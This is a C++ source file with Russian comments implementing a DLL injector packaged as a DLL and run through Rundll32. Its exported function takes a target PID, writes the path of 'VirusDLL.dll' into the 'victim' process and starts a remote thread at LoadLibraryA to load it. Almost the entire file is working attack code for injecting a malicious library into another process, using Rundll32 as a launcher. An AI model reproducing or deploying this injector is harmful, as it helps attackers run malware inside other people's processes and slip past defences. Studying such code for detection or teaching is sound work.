/// @file DllInjectorAsDll/Source.cpp
/// @brief Инжектор DLL в виде библиотеки, запускаемой через Rundll32.
///        Экспортирует функцию HelperFunc, принимающую PID целевого процесса.
///
/// Пример запуска:
/// @code
/// Rundll32.exe DllInjectorAsDll.dll HelperFunc <PID>
/// @endcode

#include <Windows.h>
#include <winerror.h>

/// @brief Выполняет инъекцию VirusDLL.dll в указанный процесс.
///
/// Реализует классическую схему LoadLibrary-инъекции:
/// выделяет память в жертве, пишет туда путь к DLL,
/// запускает удалённый поток с точкой входа LoadLibraryA.
///
/// @param dwProcessID PID целевого процесса.
void DllInjector(DWORD dwProcessID)
{
    /// Имя DLL, которую внедряем. Поиск по стандартным путям Windows.
    char szDLLPathToInject[] = {"VirusDLL.dll"};
    int nDLLPathLen = lstrlenA(szDLLPathToInject);
    int nTotBytesToAllocate = nDLLPathLen + 1;  // включая нулевой символ

    // 0. Открываем целевой процесс с правами на запись в память и создание потоков.
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwProcessID);

    // 1. Выделяем память в адресном пространстве жертвы под путь к DLL.
    LPVOID lpHeapBaseAddress1 = VirtualAllocEx(hProcess, NULL, nTotBytesToAllocate, MEM_COMMIT, PAGE_READWRITE);

    // 2. Записываем путь к DLL в выделенную память жертвы.
    SIZE_T lNumberOfBytesWritten = 0;
    WriteProcessMemory(hProcess, lpHeapBaseAddress1, szDLLPathToInject, nTotBytesToAllocate, &lNumberOfBytesWritten);

    // 3.0. Получаем адрес LoadLibraryA из kernel32.dll — одинаков во всех процессах сессии.
    LPTHREAD_START_ROUTINE lpLoadLibraryStartAddress =
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA");

    // 3.1. Запускаем поток в жертве: LoadLibraryA загрузит DLL и вызовет DllMain.
    CreateRemoteThread(hProcess, NULL, 0, lpLoadLibraryStartAddress, lpHeapBaseAddress1, 0, NULL);

    CloseHandle(hProcess);
}

/// @brief Экспортируемая функция для вызова через Rundll32.
///
/// Rundll32 передаёт сюда всё, что идёт после имени функции в командной строке.
/// Мы ожидаем PID целевого процесса в виде десятичной строки.
///
/// @param hwnd        Дескриптор окна (не используется).
/// @param hinst       Дескриптор модуля (не используется).
/// @param lpszCmdLine Строка аргументов — ожидается PID целевого процесса.
/// @param nCmdShow    Режим отображения окна (не используется).
extern "C" {
__declspec(dllexport) void WINAPI HelperFunc(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    DllInjector(atoi(lpszCmdLine));
}
}

/// @brief Точка входа DLL.
BOOL WINAPI DllMain(HINSTANCE hinstDLL,  // дескриптор модуля DLL
                    DWORD fdwReason,     // причина вызова
                    LPVOID lpvReserved)  // зарезервировано
{
    // Выполняем действия в зависимости от причины вызова.
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            // Инициализация при первой загрузке DLL в процесс.
            // Вернуть FALSE, чтобы отменить загрузку DLL.
            break;

        case DLL_THREAD_ATTACH:
            // Инициализация для каждого нового потока.
            break;

        case DLL_THREAD_DETACH:
            // Очистка ресурсов потока при его завершении.
            break;

        case DLL_PROCESS_DETACH:

            if (lpvReserved != nullptr)
            {
                break;  // процесс завершается — очистка не нужна
            }

            // Очистка ресурсов DLL при выгрузке из процесса.
            break;
    }
    return TRUE;  // DLL_PROCESS_ATTACH обработан успешно.
}
